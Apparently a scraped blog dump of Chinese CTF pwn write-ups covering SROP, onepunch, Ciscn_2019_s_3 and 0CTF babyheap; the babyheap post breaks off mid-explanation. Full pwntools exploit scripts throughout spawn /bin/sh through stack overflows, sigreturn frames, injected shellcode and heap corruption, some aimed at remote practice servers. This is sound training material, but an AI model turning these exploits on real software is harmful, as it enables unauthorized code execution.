noreturn.text:0000000000401037.text:0000000000401037 public start.text:0000000000401037 start proc near ; DATA XREF: LOAD:0000000000400018↑o.text:0000000000401037 call sub_401000.text:000000000040103C mov eax, 3Ch.text:0000000000401041 mov edi, 0 ; error_code.text:0000000000401046 syscall ; LINUX - sys_exit.text:0000000000401046 start endp.text:0000000000401046.text:0000000000401046 _text ends.text:0000000000401046程序只有两个函数，一个是调用了write和read的函数，另一个是调用exit的函数。很明显可以看到read处存在栈溢出，可以用SROP来做。0x002 思路由于程序没有/bin/sh，我们需要找到一个位置写入/bin/sh，这个位置需要可读可写。可以先通过程序自带的一次read进行栈溢出来执行一次sigreturn系统调用，使其能够向指定位置写入/bin/sh，然后再次进行sigreturn系统调用执行execve(&#39;/bin/sh&#39;,0,0)如何连续进行两次sigreturn系统调用？这里就需要构造SROP链了。例题2也是构造的SROP链0x003 Let’s do it!我们需要先找到一个位置用来写入/bin/sh，这个位置需要可读可写可以看到程序的DATA区权限符合我们的要求。这里选择addr = 0x402100吧12345678910111213141516pop_rax_syscall_leave_ret = 0x401032'''.text:0000000000401032 pop rax.text:0000000000401033 syscall.text:0000000000401035 leave.text:0000000000401036 retn'''syscall_leave_ret = 0x401033'''.text:0000000000401033 syscall.text:0000000000401035 leave.text:0000000000401036 retn'''addr = 0x402100然后通过SROP执行一次read系统调用12345678910111213141516#read(0,addr,300)frame = SigreturnFrame()frame.rax = constants.SYS_readframe.rdi = 0frame.rsi = addrframe.rdx = 300 frame.rsp = addr#注意这里！~frame.rbp = addr#frame.rip = syscall_leave_retpayload = 'a'*0x80 + 'b'*8payload += p64(pop_rax_syscall_leave_ret)payload += p64(15) + str(frame)c.send(payload)然后向addr写入/bin/sh并再次进行sigreturn系统调用，执行execve(&#39;/bin/sh&#39;,0,0)12345678910111213frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_leave_retpayload = '/bin/sh\\x00' + p64(pop_rax_syscall_leave_ret)payload += p64(15) + str(frame)c.send(payload)c.interactive()注意第一次构造frame的时候，我们设置了frame.rsp = addr，frame.rbp = addr，这是因为由于我们的gadgets是syscall;leave;ret，中间有个leave，leave就相当于mov rsp,rbp;pop rbp，为了构造SROP链，我们需要让rsp指向我们下一个payload的地址(这个可以参考第二个例题)，但如果我们的rbp为0的话，leave以后rsp也为0，这显然不符合我们的要求，所以这个需要让rbp=addr。但由于leave还有一个pop rbp的功能，这里构造就较为巧妙，我们addr的位置前8字节正好被写为/bin/sh\\x00，这样当我们ret的时候，正好能将p64(pop_rax_syscall_leave_ret)传给rip来执行，然后进行下一次sigreturn系统调用。0x004 完整EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *context(log_level = 'debug',arch = 'amd64',os = 'linux')#Important!!!!!!c = process('./srop')#c = remote('node3.buuoj.cn',25453)pop_rax_syscall_leave_ret = 0x401032'''.text:0000000000401032 pop rax.text:0000000000401033 syscall.text:0000000000401035 leave.text:0000000000401036 retn'''syscall_leave_ret = 0x401033'''.text:0000000000401033 syscall.text:0000000000401035 leave.text:0000000000401036 retn'''addr = 0x402100frame = SigreturnFrame()frame.rax = constants.SYS_readframe.rdi = 0frame.rsi = addrframe.rdx = 300 frame.rsp = addrframe.rbp = addrframe.rip = syscall_leave_retpayload = 'a'*0x80 + 'b'*8payload += p64(pop_rax_syscall_leave_ret)payload += p64(15) + str(frame)c.send(payload)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_leave_retpayload = '/bin/sh\\x00' + p64(pop_rax_syscall_leave_ret)payload += p64(15) + str(frame)c.send(payload)c.interactive()context(arch = &#39;amd64&#39;,os = &#39;linux&#39;)#Important!!!!!!这个一定要有，不然frame构造出来可能就不太对了。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[Hackme.inndy] onepunch","slug":"Hackme-inndy-onepunch","date":"2020-03-10T17:17:48.000Z","updated":"2020-03-28T19:21:18.396Z","comments":true,"path":"2020/03/11/Hackme-inndy-onepunch/","link":"","permalink":"http://liul14n.top/2020/03/11/Hackme-inndy-onepunch/","excerpt":"","text":"0x00 前言这道题目是在BUU上面看到的，原本是台湾的一个pwn练习平台hackme.inndy的题目，之前做了几道inndy的题目，感觉难度不大但是挺涨知识的。这道题难度不算大，写这篇博客是为了记录一些骚姿势。0x01 分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000)主函数如下123456789101112131415161718int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+8h] [rbp-18h] int v5; // [rsp+Ch] [rbp-14h] _BYTE *v6; // [rsp+10h] [rbp-10h] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); setbuf(_bss_start, 0LL); printf(\"Where What?\", 0LL); v5 = __isoc99_scanf(\"%llx %d\", &amp;v6, &amp;v4); if ( v5 != 2 ) return 0; *v6 = v4; if ( v4 == 255 ) puts(\"No flag for you\"); return 0;&#125;还有一个很可疑的函数，名字是个下划线，执行的是mprotect函数，不过这次没用到它。1234567891011121314151617181920212223242526signed __int64 _()&#123; signed __int64 result; // rax result = 10LL; __asm &#123; syscall; LINUX - sys_mprotect &#125; return result;&#125;.text:00000000004006C6 _ proc near ; DATA XREF: .init_array:0000000000600E10↓o.text:00000000004006C6 ; __unwind &#123;.text:00000000004006C6 push rbp.text:00000000004006C7 mov rbp, rsp.text:00000000004006CA lea rdi, loc_4006D1.text:00000000004006D1.text:00000000004006D1 loc_4006D1: ; DATA XREF: _+4↑o.text:00000000004006D1 and rdi, 0FFFFFFFFFFFFF000h ; start.text:00000000004006D8 mov rsi, 1000h ; len.text:00000000004006DF mov rdx, 7 ; prot.text:00000000004006E6 mov rax, 0Ah.text:00000000004006ED syscall ; LINUX - sys_mprotect.text:00000000004006EF nop.text:00000000004006F0 pop rbp.text:00000000004006F1 retn.text:00000000004006F1 ; &#125; // starts at 4006C6.text:00000000004006F1 _ endp根据main函数，我们会读入一个16进制的数到v6，然后读入一个10进制的数到v4，然后通过*v6 = v4;向16进制数的地址中写入这个10进制数，但由于前面是_BYTE *v6;，所以我们只能写入一个字节。程序存在任意地址写的漏洞，但是只能使用一次，有什么办法能让这个漏洞多次被使用呢？可以看到0x400000 - 0x401000 的代码段的权限是rwxp，也就是说这个程序的代码段可写！接着看main函数的汇编可以看到程序在判断完v4是否为255以后会有一个jnz跳转，这个在伪代码界面是不显示的，不过可以利用这个修改跳转的目的地来实现多次任意地址写。有了多次任意地址写、代码段任意地址跳转并且代码段可写，我们就可以像打着patch做题一样了，可以往代码段写入shellcode然后跳转到shellcode来执行了。0x02 Let’s do it！首先通过修改跳转的目的地来实现多次利用任意地址写漏洞在IDA中将这个地方改成4或者5就能看到汇编对应的机器码。然后来到刚才提到的.text:0000000000400767 75 0A jnz short loc_400773其中\\x75是jnz的机器码，\\x0A是跳转地址的偏移。我们先选定一个跳转目的地。这里选取了0x40071D mov edi, offset format ; &quot;Where What?&quot;然后按下N，给他rename一下，这里就改成loc_40071D吧。确定以后可以观察到如下形式然后来到刚刚那个0x400767这个地方进行keypatch将其改成jnz loc_40071D,就可以看到机器码由原来的75 0A变成了75 B4。这也就说明如果我们通过程序原本的一次任意地址写，将这个0A改成B4就能实现多次任意地址写。而这个0A在0x400768的位置，实现起来就简单了！123c.recvuntil('Where What?')c.sendline('0x400768')c.sendline('180')#0xB4 == 180向代码段写入shellcode我选的shellcode_addr = 0x400769，因为这块地方很容易触发，只需要让输入的十进制数为0XFF就可以。123456789context(log_level = 'debug',arch = 'amd64',os = 'linux')sc_addr = 0x400769shellcode = asm(shellcraft.sh())for i in range(len(shellcode)): c.recvuntil('Where What?') c.sendline(str(hex(sc_addr+i))) c.sendline(str(ord(shellcode[i])))这里有个细节我们需要保证shellcode里面不存在\\xff，因为程序会有验证输入的十进制数是否等于0xff！比较幸运的是，这么生成的shellcode不含有\\xffget shell1234c.sendline('0x400000')c.sendline('255')c.interactive()向随便一个地方写入个255就能触发程序走向0x400769,也就是我们的shellcode的位置。0x03 完整EXP12345678910111213141516171819202122232425from pwn import *context(log_level = 'debug',arch = 'amd64',os = 'linux')#c = process('./onepunch')c = remote('node3.buuoj.cn',26043)c.recvuntil('Where What?')c.sendline('0x400768')c.sendline('180')#0xB4 == 180sc_addr = 0x400769shellcode = asm(shellcraft.sh())for i in range(len(shellcode)): c.recvuntil('Where What?') c.sendline(str(hex(sc_addr+i))) c.sendline(str(ord(shellcode[i])))c.sendline('0x400000')c.sendline('255')c.interactive()0x04 参考链接传送门先知社区CSDN感谢各位师傅们的博客","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"Ciscn_2019_s_3","slug":"Ciscn-2019-s-3","date":"2020-03-07T12:44:11.000Z","updated":"2020-10-07T06:59:40.105Z","comments":true,"path":"2020/03/07/Ciscn-2019-s-3/","link":"","permalink":"http://liul14n.top/2020/03/07/Ciscn-2019-s-3/","excerpt":"","text":"0x00 前言这道题目对我来说还是有些难度的。通过这道题目，我学到了两种漏洞利用手段:ret2__libc_csu_init、SROP。题目在BUUCTF可以下到。0x01 分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)关键函数是vuln和gadgets函数。先来看vuln函数，IDA的伪代码界面只能看出来这是个syscall，看不到函数的具体参数，所以来看汇编。转换一下就是read(0,&amp;rsp-0x10,0x400) 、 write(1,&amp;rsp-0x10,0x30)这里可以通过溢出来劫持RIP。再来看gadgets函数这里需要注意两个地方mov rax,15和mov rax,59这里涉及到Linux系统调用15对应的是sys_rt_sigreturn系统调用59对应的是sys_execve系统调用所以这道题目可以有两种办法来做。第一种办法是依靠59对应的execve，然后想办法执行execve(“/bin/sh”,0,0)第二种办法是依靠15对应的sys_rt_sigreturn，借助sigreturn frame来执行execve(“/bin/sh”,0,0)0x02 方法一 ret2__libc_csu_init借助59对应的sys_execve利用思路由于程序没有给我们/bin/sh，我们需要通过read函数手动输入，但是我们需要知道我们的输入存在什么地方了？可以知道输入是存在栈上了，所以可以先泄露栈地址。当我们拿到栈地址并且知道/bin/sh\\x00的地址，就可以通过rop执行execve(“/bin/sh”,0,0)，其中传参所用寄存器依次是rdi、rsi、rdx，分别对应/bin/sh、0 、 0 ，而要执行系统调用 还需要rax = 59。syscall可以在IDA中找到。Try it ！Leak stack addr123main = 0x4004EDpayload = '/bin/sh\\x00' + 'b'*8 + p64(main)c.send(payload)关于这个payload有一点需要说明由于程序中调用完syscall后就直接进行了retn，而且此时rsp == rbp，所以我们payload中p64(main)就对应的是返回地址。通过调试1230x7fffffffdda0: 0x0068732f6e69622f 0x6262626262626262 &lt;- rsp-0x10==/bin/sh\\x00 + 'b'*80x7fffffffddb0: 0x00000000004004ED 0x0000000000400536 0x7fffffffddc0: 0x00007fffffffdeb8 0x0000000100000000可以看到0x7fffffffddc0位置存着一处栈地址，并且这个地址离我们输入的/bin/sh\\x00的距离为0x00007fffffffdeb8 - 0x7fffffffdda0 = 0x118，这个偏移是固定的，那么我们可以通过write函数打印出这个地址，然后减去这个偏移，就能得到/bin/sh的地址。123offset = 0x118binsh = u64(c.recv()[32:40]) - 0x118log.success('binsh = ' + hex(binsh))ret2__libc_csu_init1234567891011121314151617181920212223242526272829303132333435363738394041execv = 0x4004E2'''.text:00000000004004E2 ; .text:00000000004004E2 mov rax, 59.text:00000000004004E9 retn'''syscall = 0x400517'''.text:0000000000400517 syscall ;'''p6r = 0x40059A'''.text:0000000000400596 loc_400596:.text:0000000000400596 add rsp, 8.text:000000000040059A pop rbx.text:000000000040059B pop rbp.text:000000000040059C pop r12.text:000000000040059E pop r13.text:00000000004005A0 pop r14.text:00000000004005A2 pop r15.text:00000000004005A4 retn'''movcall = 0x400580'''.text:0000000000400580 loc_400580:.text:0000000000400580 mov rdx, r13.text:0000000000400583 mov rsi, r14.text:0000000000400586 mov edi, r15d.text:0000000000400589 call qword ptr [r12+rbx*8].text:000000000040058D add rbx, 1.text:0000000000400591 cmp rbx, rbp.text:0000000000400594 jnz short loc_400580'''pop_rdi_ret = 0x00000000004005a3'''0x00000000004005a3 : pop rdi ; ret'''除了pop_rdi_ret是用的ROPgadget --binary ciscn_s_3 --only &#39;pop|ret&#39;找到的其他都可以在IDA里面找到这道题目的核心也就在__libc_csu_init里面的loc_400596与loc_400580了r13能传给rdxr14传给rsir15d能传给edi最后call [r12 + rbx*8]，然后比较rbx和rbp是否相等，如果不等，则循环执行loc_400580这个payload构造的非常巧妙，反正我自己是构造不出来12345678payload = '/bin/sh\\x00' + 'b'*8 + p64(p6r)payload += p64(0)*2 + p64(binsh + 0x50) + p64(0)*3payload += p64(movcall) + p64(execv)payload += p64(pop_rdi_ret) + p64(binsh) + p64(syscall)c.send(payload)c.interactive()注意第二行，有几点需要说明。首先是让rbx和rbp都为0(只要保证rbx+1不等于rbp就行)，这样是有目的的，是为了能够过会执行0x40058D add rbx, 1以后 rbx不等于rbp，然后执行jnz short loc_400580从而再次进入循环来执行call qword ptr [r12+rbx*8]其次是p64(binsh + 0x50)，这个是要传给rsi的，binsh + 0x50正好对应的就是p64(execv)，第一次执行call qword ptr [r12+rbx*8]时，由于rbx = 0，所以就相当于执行call [r12]即call [rsi]，也就是执行execv = 0x4004E2对应的mov rax,59;ret。注意这里的call指令，相当于jmp 到 r12 + rbx*8这个地址里存放的地址，以这里为例，这就相当于 jmp 0x4004E2注意到前面是r15d传给edi，而不是rdi。r15d指的是r15的低32位，edi也是rdi的低32位，因此为了防止rdi里面曾存有其他数据占用了高32位，需要先通过p6r令rdi = 0 ，所以payload第二行后面的对应rdi位置的是p64(0)payload的执行流程实际上这个payload的执行流程由于涉及到call qword ptr [r12+rbx*8]而变得挺有趣而且巧妙的，可以调试跟一下，挺好玩的首先当我们向程序输入payload以后，程序会返回到p64(p6r)来执行一系列pop和ret，p64(p6r)的ret会返回到p64(movcall)从而进入一个我们故意设置的循环(利用的是故意让rbx不等于rbp从而执行cmp rbx, rbp;jnz short loc_400580)此刻从整体来看, RSP是指向栈中p64(execv)对应的位置的。ps : 由于在执行call qword ptr [r12+rbx*8]的时候RSP也会变化并在call返回是还原RSP本来的值，但为了分析payload的执行流程，忽略call时RSP的变化从整体来看比较好 。第一次执行完call qword ptr [r12+rbx*8]，由于经过了add rbx,1,所以此时rbx=1，rbp=0，它俩不相等，所以循环到loc_400580执行第二次循环。而这次就会执行call [rsi + 8]，也就是执行pop_rdi_ret，由于此时RSP指向的是栈中p64(execv)的位置，那么当我们pop rdi的时候，会将RSP指向的值即p64(execv)传给rdi，同时RSP += 8，此刻RSP指向栈中p64(pop_rdi_ret)的位置，当执行ret的时候，RIP便指向了p64(pop_rdi_ret)，同时 RSP += 8，从而跳出了我们设置的循环，此刻RSP指向栈中p64(binsh)对应的位置。逃离了call qword ptr [r12+rbx*8]这个循环怪圈以后，通过pop rdi，将binsh 传给了rdi，然后ret到syscall执行系统调用。payload很巧妙，能够利用循环并且跳出循环可惜我太菜了，自己构造不出来，自己构造出来的一个看似能打通的实际上打不通。。。完整EXP1.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *c = process('./ciscn_s_3')#c = remote('node3.buuoj.cn',28019)main = 0x4004EDexecv = 0x4004E2'''.text:00000000004004E2 ; .text:00000000004004E2 mov rax, 59.text:00000000004004E9 retn'''syscall = 0x400517'''.text:0000000000400517 syscall ;.text:0000000000400519 retn ;'''p6r = 0x40059A'''.text:000000000040059A pop rbx.text:000000000040059B pop rbp.text:000000000040059C pop r12.text:000000000040059E pop r13.text:00000000004005A0 pop r14.text:00000000004005A2 pop r15.text:00000000004005A4 retn'''movcall = 0x400580'''.text:0000000000400580 loc_400580:.text:0000000000400580 mov rdx, r13.text:0000000000400583 mov rsi, r14.text:0000000000400586 mov edi, r15d.text:0000000000400589 call qword ptr [r12+rbx*8].text:000000000040058D add rbx, 1.text:0000000000400591 cmp rbx, rbp.text:0000000000400594 jnz short loc_400580'''pop_rdi_ret = 0x00000000004005a3'''0x00000000004005a3 : pop rdi ; ret'''payload = '/bin/sh\\x00' + 'b'*8 + p64(main)c.send(payload)offset = 0x118binsh = u64(c.recv()[32:40]) - 0x118log.success('binsh = ' + hex(binsh))payload = '/bin/sh\\x00' + 'b'*8 + p64(p6r)payload += p64(0)*2 + p64(binsh + 0x50) + p64(0)*3payload += p64(movcall) + p64(execv)payload += p64(pop_rdi_ret) + p64(binsh) + p64(syscall)c.send(payload)c.interactive()0x03 方法二 SROP利用思路与方法一相同，都要先泄露栈，目的是为了泄露我们输入的/bin/sh的存放地址。然后伪造sigreturn frame 来执行execve(“/bin/sh”,0,0)Try it！Leak stack addr和方法一相同1234567891011from pwn import *c = process('./ciscn_s_3')context(arch='amd64', os='linux')#Important!!!!!!!!!!main = 0x4004EDpayload = '/bin/sh\\x00' + 'b'*8 + p64(main)c.send(payload)offset = 0x118binsh = u64(c.recv()[32:40]) - 0x118log.success('binsh = ' + hex(binsh))伪造sigreturn frame 来执行execve(“/bin/sh”,0,0)pwntools里面有sigreturn frame 相关模块。1234567891011121314151617181920212223sigreturn = 0x4004DA'''.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn'''syscall = 0x400517'''.text:0000000000400517 syscall ;.text:0000000000400519 retn ;'''frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = binshframe.rsi = 0frame.rdx = 0frame.rip = syscallpayload = '/bin/sh\\x00' + 'b'*8 + p64(sigreturn) + p64(syscall) + str(frame)c.send(payload)c.interactive()这个模块用起来相当方便啊，只需要指定各个寄存器的值就好了。关于这个sigreturn，有点高深，具体可以去搜一下，不过应对CTF的SROP题目的话，会用这个SigreturnFrame模块应该就够了。有一点需要说明context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)，这个一定要指明，不然会报错。完整EXP2.py123456789101112131415161718192021222324252627282930313233343536373839from pwn import *c = process('./ciscn_s_3')#c = remote('node3.buuoj.cn',28019)context(arch='amd64', os='linux')#Important!!!!!!!!!!Important!!!!!!!!!!main = 0x4004EDsigreturn = 0x4004DA'''.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn'''syscall = 0x400517'''.text:0000000000400517 syscall ;.text:0000000000400519 retn ;'''payload = '/bin/sh\\x00' + 'b'*8 + p64(main)c.send(payload)offset = 0x118binsh = u64(c.recv()[32:40]) - 0x118log.success('binsh = ' + hex(binsh))frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = binshframe.rsi = 0frame.rdx = 0frame.rip = syscallpayload = '/bin/sh\\x00' + 'b'*8 + p64(sigreturn) + p64(syscall) + str(frame)c.send(payload)c.interactive()0x04 写在最后这道题真的用了挺长时间的，加上更博客也用了不少时间，不过又调试了一遍又有了新收获新理解。参考链接:CSDNCTF-WIKI最后要感谢各位师傅们的博客以及BUUCTF","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"0CTF 2017 babyheap","slug":"0CTF-2017-babyheap","date":"2020-03-02T09:00:42.000Z","updated":"2020-03-22T17:03:06.705Z","comments":true,"path":"2020/03/02/0CTF-2017-babyheap/","link":"","permalink":"http://liul14n.top/2020/03/02/0CTF-2017-babyheap/","excerpt":"","text":"0x00 前言前段时间在CTF-WIKI上面学习Fastbin Attack的时候遇到过这道题目，因为这道题目涉及了一些当时还未学到的知识，就略过了这道题目。今天在BUUCTF上又刷到了这道题目，知识储备也够做这道题目了。但依然遇到了一些小困难，这道题目细节还是挺多的。题目可以去BUUCTF上面下载，也可以从CTF-WIKI上面的下载链接来下载下载链接0x01 分析12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled题目的保护全开123451. Allocate2. Fill3. Free4. Dump5. Exit题目共有5个功能1. Allocate该函数采用calloc的方式申请堆块，且申请size要小于等于4096。malloc申请后空间的值是随机的，并没有进行初始化，而calloc却在申请后，对空间逐一进行初始化，并设置值为0。该程序最多申请16个堆块，每次申请堆块时，会在一个地址( 这个地址每次运行都不一样，这个地址的生成算法在sub_B70函数 )附近存放该堆块的信息(是否申请，size，content指针)。格式如下:是否已申请? 1 : 0sizecontent指针2. Fill该函数能实现无限写功能，存在堆溢出。在这个函数里面，程序要求我们输入一个size，这个size不同于我们1. Allocate里面要求输入的size。这是两个完全独立的变量，只不过名字都叫size。3. Free该函数能够进行释放堆块，free掉content指针，并且置为NULL4. Dump该函数会根据1. Allocate里的size的大小来输出content指针所指向的内容，size多大就输出多少个字节的内容。5. Exit退出程序基本思路由于用来存放chunk信息的那块地址每次都不一样，不太好通过修改content指针进而修改其内容来偷梁换柱，而且程序是Full RELRO，也没办法通过覆盖got表来getshell。不过可以用__malloc_hook或者__free_hook。本文采用__malloc_hook，如果用__free_hook原理一样。其原理是:malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数,可以通过写 malloc_hook 让其指针不为空来执行我们所设置的函数来 getshell首先，我们需要泄露libc地址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，这里借助smallbin的fd和bk指向main_arena来泄露libc基地址。然后利用fastbin attack 将chunk分配到__malloc_hook附近，从而修改__malloc_hook0x02 Let’s do it ！前期模板123456789101112131415161718192021222324252627282930313233343536from pwn import *#context.log_level = 'debug'c = process('./babyheap')elf = ELF('./babyheap')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#c = remote('node3.buuoj.cn',29105)def alloc(size): c.recvuntil('Command: ') c.sendline('1') c.recvuntil('Size: ') c.sendline(str(size))def fill(idx,size,cont): c.recvuntil('Command: ') c.sendline('2') c.recvuntil('Index: ') c.sendline(str(idx)) c.recvuntil('Size: ') c.sendline(str(size)) c.recvuntil('Content: ') c.sendline(cont)def free(idx): c.recvuntil('Command: ') c.sendline('3') c.recvuntil('Index: ') c.sendline(str(idx))def dump(idx): c.recvuntil('Command: ') c.sendline('4') c.recvuntil('Index: ') c.sendline(str(idx))Leak libc当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写能力那么我们可以这样设置堆块。1234alloc(0x50)#0alloc(0x40)#1alloc(0x80)#2alloc(0x10)#3堆块0大小没有严格要求，但别太离谱，这个堆块是用来修改chunk1的header的。堆块1大小似乎必须是0x40，这是有目的的，后续会讲到。堆块2需要是samllbin，这是为了通过unsorted bin泄露libc。堆块3是为了不让堆块2和top chunk紧邻而申请的，大小和堆块0一样，没有严格要求，但别太离谱。12345678910111213141516171819202122232425申请完以后布局如下0x555555757000: 0x0000000000000000 0x00000000000000610x555555757010: 0x0000000000000000 0x00000000000000000x555555757020: 0x0000000000000000 0x00000000000000000x555555757030: 0x0000000000000000 0x00000000000000000x555555757040: 0x0000000000000000 0x00000000000000000x555555757050: 0x0000000000000000 0x00000000000000000x555555757060: 0x0000000000000000 0x00000000000000510x555555757070: 0x0000000000000000 0x00000000000000000x555555757080: 0x0000000000000000 0x00000000000000000x555555757090: 0x0000000000000000 0x00000000000000000x5555557570a0: 0x0000000000000000 0x00000000000000000x5555557570b0: 0x0000000000000000 0x00000000000000910x5555557570c0: 0x0000000000000000 0x00000000000000000x5555557570d0: 0x0000000000000000 0x00000000000000000x5555557570e0: 0x0000000000000000 0x00000000000000000x5555557570f0: 0x0000000000000000 0x00000000000000000x555555757100: 0x0000000000000000 0x00000000000000000x555555757110: 0x0000000000000000 0x00000000000000000x555555757120: 0x0000000000000000 0x00000000000000000x555555757130: 0x0000000000000000 0x00000000000000000x555555757140: 0x0000000000000000 0x00000000000000210x555555757150: 0x0000000000000000 0x00000000000000000x555555757160: 0x0000000000000000 0x0000000000020ea10x555555757170: 0x0000000000000000 0x0000000000000000然后我们需要通过修改chunk1的size来实现chunk1的扩张，具体就是先修改size，然后free，然后再申请，因为这是fastbin，申请后还在这。需要扩张是因为dump函数是根据chunk的size来决定输出多少内容的。扩张多少？ 扩张到能够输出chunk2的fd和bk就行，也就是扩张0x20。那么chunk1的size需要改成0x71。12payload = 'a'*0x50 + p64(0) + p64(0x71)fill(0,len(payload),payload)借助fill函数里的无限写，很容易能实现扩张。但是这里需要注意的是: 由于程序采用的calloc函数进行申请，会初始化所申请的堆块，也就是说，如果我们free(1)，然后再申请回来1，因为已经扩张了，chunk2的header和data区的前0x10个字节都会被初始化为0。一个细节(疑惑)这里还有一个细节：12payload = 'a'*0x10 + p64(0) + p64(0x71)fill(2,len(payload),payload)这里还需要修改一下chunk2的内容，这样做有点伪造chunk的意思，后面这个p64(0x71)就在chunksize的位置。这一步确实是需要有的，如果没有的话exp就会崩。查阅了一些博客，大部分博主都说这一步的目的是Corrupting smallbin-&gt;size to pass allocation assert，也就是绕过alloc的验证，不然过会free(1),alloc(0x60)会失败。但是如果不加上这个p64(0x71)，就连free(1)都会导致程序崩溃，这似乎和unlink有关？0x71 被称为chunksize ,下面这段代码是malloc.c中的一段代码，如果fastbin_index (chunksize (victim)) != idx， 就会corruption, free的时候也会检查chunksize, 根据chunksize的大小，free相应的空间.1234567891011if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))&#123; errstr = \"malloc(): memory corruption (fast)\";errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL;&#125;#define fastbin_index(sz) \\ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)比较奇怪的是: p64(11) ,p64(61),p64(62),p64(111),p64(1111)还有一堆我试了试都可以，似乎只要大于等于11且不是太大都可以， 应该没必要非得是p64(71)吧？继续然后利用fastbin的特性，free然后alloc 实现堆块重叠12free(1)alloc(0x60)然后给smallbin 恢复它的header12payload = 'a'*0x40 + p64(0) + p64(0x91)fill(1,len(payload),payload)然后free掉smallbin，这样它的fd和bk都会指向main_arena的一块地址1free(2)来看一下效果123456789101112131415161718192021222324250x555555757000: 0x0000000000000000 0x00000000000000610x555555757010: 0x6161616161616161 0x61616161616161610x555555757020: 0x6161616161616161 0x61616161616161610x555555757030: 0x6161616161616161 0x61616161616161610x555555757040: 0x6161616161616161 0x61616161616161610x555555757050: 0x6161616161616161 0x61616161616161610x555555757060: 0x0000000000000000 0x0000000000000071&lt;--chunk1 -0x555555757070: 0x6161616161616161 0x6161616161616161 |0x555555757080: 0x6161616161616161 0x6161616161616161 |0x555555757090: 0x6161616161616161 0x6161616161616161 |这些都是chunk10x5555557570a0: 0x6161616161616161 0x6161616161616161 |0x5555557570b0: 0x0000000000000000 0x0000000000000091&lt;--chunk2 |0x5555557570c0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78&lt;--fd bk —0x5555557570d0: 0x0000000000000000 0x00000000000000710x5555557570e0: 0x0000000000000000 0x00000000000000000x5555557570f0: 0x0000000000000000 0x00000000000000000x555555757100: 0x0000000000000000 0x00000000000000000x555555757110: 0x0000000000000000 0x00000000000000000x555555757120: 0x0000000000000000 0x00000000000000000x555555757130: 0x0000000000000000 0x00000000000000000x555555757140: 0x0000000000000090 0x00000000000000200x555555757150: 0x0000000000000000 0x00000000000000000x555555757160: 0x0000000000000000 0x0000000000020ea10x555555757170: 0x0000000000000000 0x00000000000000000x555555757180: 0x0000000000000000 0x0000000000000000来看一下smallbin的fd和bk指向的是哪？10x7ffff7dd1b78 &lt;main_arena+88&gt;: 0x0000555555757160可以看到 它们指向了main_arena + 88而本地libc的加载地址是0x7ffff7a0d000，而这个地址和smallbin的fd的偏移为0x3c4b7812pwndbg&gt; distance 0x7ffff7a0d000 0x7ffff7dd1b780x7ffff7a0d000-&gt;0x7ffff7dd1b78 is 0x3c4b78 bytes (0x7896f words)这个偏移无论是打远程还是本地，都是不变的，我们有了这个偏移以后，就可以通过dump出fd或者bk的值，然后减去偏移，就能得到libcbase。用代码来实现即:123456dump(1)c.recvuntil('Content: \\n')main_arena = u64(c.recvuntil('\\n',drop = True)[-8:])log.success('main_arena + 88 = ' + hex(main_arena))offset = 0x3c4b78libcbase = main_arena-offsetgetshell选取fake_chunk首先要在__malloc_hook附近找到合适的地址伪造一个chunk用于fastbin double free12malloc_hook = libc.symbols[\"__malloc_hook\"]+libcbasefake_chunk = malloc_hook - 0x23注意这里为什么fake_chunk是 malloc_hook - 0x23 ？我们来看__malloc_hook附近123456789100x7ffff7dd1ac0 &lt;_IO_wide_data_0+256&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1ad0 &lt;_IO_wide_data_0+272&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1ae0 &lt;_IO_wide_data_0+288&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1af0 &lt;_IO_wide_data_0+304&gt;: 0x00007ffff7dd0260 0x00000000000000000x7ffff7dd1b00 &lt;__memalign_hook&gt;: 0x00007ffff7a92e20 0x00007ffff7a92a000x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b20 &lt;main_arena&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000 0x0000000000000000很遗憾，如果我们直接选取malloc_hook -0x10 或 -0x20 、 -0x30、-0x40， 那么我们的fake_chunk的chunksize都只能是0，这肯定不是我们想要的结果。由于fake_chunk指向的是chunk header，我们至少要从-0x10 